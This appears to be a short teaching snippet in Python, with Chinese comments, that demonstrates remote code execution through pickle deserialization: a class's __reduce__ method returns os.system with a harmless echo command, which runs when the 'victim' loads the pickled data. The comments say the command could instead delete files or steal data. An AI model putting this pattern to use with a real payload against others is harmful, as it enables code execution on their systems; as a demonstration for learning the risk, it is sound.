import pickle
import os

class Malicious:
    def __reduce__(self):
        # 当对象被反序列化时，会执行这个命令
        # 这里演示打印一句话，实际上可以是删除文件或窃取数据
        return (os.system, ("echo '你被攻击了!'",))

# 攻击者生成恶意数据
malicious_data = pickle.dumps(Malicious())

# 受害者加载数据
pickle.loads(malicious_data) # 输出: 你被攻击了! (并返回执行结果)